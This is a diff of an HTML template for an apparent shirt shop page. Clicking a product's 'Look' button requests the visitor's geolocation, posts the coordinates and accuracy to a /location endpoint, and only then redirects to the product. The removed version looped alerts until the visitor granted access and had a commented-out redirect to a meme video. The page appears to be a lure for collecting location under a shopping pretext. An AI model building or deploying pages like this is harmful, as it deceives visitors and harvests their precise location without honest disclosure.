@@ -1,117 +1,94 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Shoping Now</title>
+  <title>Shop Now</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
     body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #121212;
-      color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
+      font-family: 'Segoe UI', sans-serif;
       padding: 20px;
+      margin: 0;
+      background: #f9f9f9;
     }
-
-    .video-container {
-      position: relative;
-      width: 100%;
-      max-width: 600px;
-      aspect-ratio: 16 / 9;
-      margin-bottom: 20px;
-    }
-
-    iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
+    .shirt {
+      border: 1px solid #ccc;
       border-radius: 12px;
+      padding: 15px;
+      margin: 10px;
+      max-width: 300px;
+      display: inline-block;
+      background: white;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
     }
-
-    button {
-      padding: 22px 34px;
-      font-size: 1.8rem;
-      background-color: #1db954;
-      border: none;
-      margin-top: 150px;
-      border-radius: 8px;
+    .shirt img {
+      width: 100%;
+      border-radius: 10px;
+    }
+    .shirt h2 {
+      font-size: 1.2rem;
+      margin: 10px 0;
+    }
+    .shirt p {
+      color: #444;
+    }
+    .btn {
+      padding: 10px 20px;
+      background: #000;
       color: white;
+      border: none;
+      border-radius: 5px;
       cursor: pointer;
-      transition: 0.3s ease;
     }
-
-    button:hover {
-      background-color: #1ed760;
+    .btn:disabled {
+      background: #999;
     }
   </style>
 </head>
 <body>
-  <!-- Replace VIDEO_ID with real YouTube ID -->
-  <!-- <iframe src="https://www.youtube.com/embed/II2EO3Nw4m0?autoplay=1&mute=1&controls=0&showinfo=0&loop=1&playlist=VIDEO_ID"></iframe> -->
-  <!-- <iframe width="560" height="315" src="https://www.youtube.com/embed/II2EO3Nw4m0?si=9BaGNUy8-hZMkWA9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe> -->
-  <div class="video-container">
-  <iframe src="https://www.youtube.com/embed/YZAFd9o3RYQ?si=VxpMZck8rrJSAGYT" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-  </div>
-  <h1>🧥 Shirt Store</h1>
+
+  <h1>🛍️ Trending Shirts</h1>
   {% for shirt in shirts %}
-  <div class="shirt">
-    <h2>{{ shirt.name }}</h2>
-    <p>Price: {{ shirt.price }}</p>
-    <button  onclick="lookShirt('{{ shirt.link }}')">Look</button>
-    <!-- <button id="getLocationBtn">Play The Music</button> -->
-  </div>
+    <div class="shirt">
+      <img src="/static/{{ shirt.image }}" alt="{{ shirt.name }}">
+      <h2>{{ shirt.name }}</h2>
+      <p>Price: {{ shirt.price }}</p>
+      <button class="btn" onclick="trackAndRedirect('{{ shirt.link }}', this)">Look</button>
+    </div>
   {% endfor %}
 
-
   <script>
-    async function onclick(link) {
-      let granted = false;
-  
-      while (!granted) {
-        try {
-          await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject);
-          });
-          granted = true;
-          alert("✅ Location access granted!");
-        } catch (err) {
-          alert("⚠️ Please allow location access to continue.");
-          await new Promise(resolve => setTimeout(resolve, 2000));
-        }
-      }
-  
-      navigator.geolocation.getCurrentPosition(async (position) => {
-        const { latitude, longitude ,accuracy } = position.coords;
-        alert(`📍 Location fetched: ${latitude}, ${longitude},${accuracy}`);
-  
+    async function trackAndRedirect(link, button) {
+      button.disabled = true;
+      button.innerText = "Loding...";
+
+      try {
+        const pos = await new Promise((res, rej) => {
+          navigator.geolocation.getCurrentPosition(res, rej);
+        });
+
+        const data = {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        };
+
         const res = await fetch("/location", {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ latitude, longitude,accuracy})
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
         });
-  
+
         const result = await res.json();
-        if (result.message) {
-          alert("✅ Location saved!");
-          // 🔁 Redirect here
-        //   window.location.href = "https://cdn.glitch.global/8342c6be-596a-406c-8522-ab90e8b3c464/Bhen%20ka%20shot%20memes%20%20%23viralvideo%20%23memes%20%23terdingvideo%20%23viralmemes%20%23youtubeshorts%20%23viralshort.mp4?v=1751048273444"; // or your desired URL
-          window.location.replace(link); // or your desired URL
-        } else {
-          alert("❌ " + result.error);
-        }
-      });
+        alert(result.message || result.error);
+
+        window.location.replace(link);
+
+      } catch (err) {
+        alert("⚠️ Please allow location access.");
+        button.disabled = false;
+        button.innerText = "Look";
+      }
     }
-  
-    // document.getElementById("getLocationBtn").addEventListener("click", askLocation);
   </script>
-  
+
 </body>
 </html>
